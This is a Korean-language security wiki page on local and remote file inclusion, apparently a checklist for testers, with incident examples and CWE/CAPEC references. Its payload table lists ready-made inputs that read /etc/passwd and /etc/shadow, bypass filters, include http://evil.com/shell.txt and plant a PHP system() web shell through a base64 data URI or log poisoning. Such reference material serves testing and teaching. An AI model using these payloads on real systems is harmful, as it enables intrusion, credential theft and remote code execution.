---
title: LFI/RFI (Local/Remote File Inclusion) — 방어와 실무
created: 2026-06-13
updated: 2026-06-16
type: concept
tags: [security, lfi, rfi, file-inclusion, path-traversal, php]
sources: [https://owasp.org/www-community/attacks/Path_Traversal, https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Inclusion]
confidence: high
---

# LFI/RFI (Local/Remote File Inclusion) — 방어와 실무

> [[lfi-rfi]]의 방어 기법과 테스트 체크리스트를 다루는 분할 페이지입니다.

## Step 3: 전문 용어 설명 (위키백과/OWASP/PortSwigger 기반)
### LFI/RFI 테스트 체크리스트

| 테스트 항목 | 페이로드 예시 |
|------------|---------------|
| **기본 LFI** | `?file=../../../etc/passwd`, `?page=../../../etc/shadow` |
| **인코딩 우회** | `..%2f..%2f..%2fetc%2fpasswd`, `..%252f..%252f..%252fetc%252fpasswd` |
| **NULL 바이트** | `?file=../../../etc/passwd%00` |
| **래퍼 프로토콜** | `?file=php://filter/convert.base64-encode/resource=/etc/passwd` |
| **데이터 URI** | `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=` |
| **RFI 기본** | `?file=http://evil.com/shell.txt` |
| **RFI 데이터 URI** | `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=` |
| **로그 인젝션** | User-Agent: `<?php system($_GET['cmd']); ?>` → `?file=../logs/access.log` |
| **/proc/self/environ** | `?file=/proc/self/environ` (User-Agent 주입 후) |
| **세션 파일** | `?file=/var/lib/php/sess_<session_id>` |
| **업로드 파일** | `?file=../uploads/shell.jpg` (이미지에 PHP 코드 숨김) |

### 주요 LFI/RFI 사고 사례

| 사고 | 연도 | 벡터 | 피해 |
|------|------|------|------|
| **PHPMyAdmin** | 2011 | `?page=../../../etc/passwd` | 서버 파일 유출 |
| **WordPress 플러그인** | 다수 | `wp-admin/admin-ajax.php` + `action=load_template` + `template=../../../wp-config.php` | 수만 사이트 소스코드 유출 |
| **Joomla** | 2015 | 컴포넌트 `controller` 파라미터 LFI | 핵심 설정 파일 유출 |
| **DVWA** | 교육용 | 의도적 LFI/RFI 실습 환경 | 교육용 |
| **PHP 내장 서버** | 2012 | `php -S 0.0.0.0:8000` + `include($_GET['f'])` | 교육/데모용 |

### 관련 표준 및 참고

| 표준/문서 | 내용 |
|----------|------|
| **OWASP File Inclusion** | 파일 포함 취약점 종합 가이드 |
| **OWASP Path Traversal** | 경로 순회와 결합된 LFI |
| **CWE-98** | Improper Control of Filename for Include/Require Statement ('PHP File Inclusion') |
| **CWE-22** | Path Traversal |
| **CAPEC-184** | File Inclusion |

---



## 관련 위키 링크
- [[lfi-rfi]] — LFI/RFI 메인 페이지
- [[lfi-rfi-core]] — 핵심 메커니즘
- [[path-traversal]] — 경로 순회
- [[rce]] — 원격 코드 실행
